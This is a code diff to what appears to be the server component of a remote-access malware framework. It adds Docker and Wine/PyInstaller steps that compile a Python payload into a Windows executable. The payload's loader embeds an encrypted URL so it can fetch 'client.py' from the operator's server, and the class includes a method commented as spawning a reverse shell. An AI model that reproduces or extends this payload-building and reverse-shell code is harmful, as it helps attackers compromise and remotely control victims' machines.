@@ -230,12 +230,24 @@ class server():
         payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
         url = self.url + "/client.py"
         helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload/payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
-          
-
+        env = os.environ.copy()
+        env['DOCKER_BUILDKIT'] = '1'
+        env['BUILDKIT_PROGRESS'] = 'plain'  # Optional: For plain progress output
         
-        helpers.show(f"PAYLOAD FILE WRITTEN TO PAYLOAD DIRECTORY", colour='GREEN', style='BRIGHT', end='\n->')
+        subprocess.call(['docker', 'build', '-f', 'Dockerfiles/Dockerfile_winbuilder', '--tag', 'winbuilder', '.'], env=env)
+        
+        subprocess.call(['docker', 'run', '-v','/app/payload:/test2','-it', 'winbuilder'])
+       
+        #docker build -t kicsikrumpli/wine-pyinstaller:latest .
 
-    
+        #subprocess.call(['docker', 'build', '-t', 'kicsikrumpli/wine-pyinstaller:latest', '/app/Dockerfiles/wine-pyinstaller'])
+        #subprocess.call(['docker', 'run', '-it', '-v', "/app/payload:/src", 'kicsikrumpli/wine-pyinstaller', '--clean', '--onefile', 'payload/payload.py'])   
+        #subprocess.call(['docker', 'build', '-t', 'windows', '-f', 'Dockerfiles/Dockerfile.win', '.'])
+        #subprocess.call(['docker','create','--name','payload-windows','windows'])
+        #subprocess.call(['docker','cp','payload-windows:/app/payload.exe','payload/payload.exe'])
+        #subprocess.call(['docker','rm','payload-windows'])
+
+        helpers.show(f"PAYLOAD FILE WRITTEN TO PAYLOAD DIRECTORY", colour='GREEN', style='BRIGHT', end='\n->')   
     def _shell(self):
         #spawn a reverse shell
         self.start_shell()
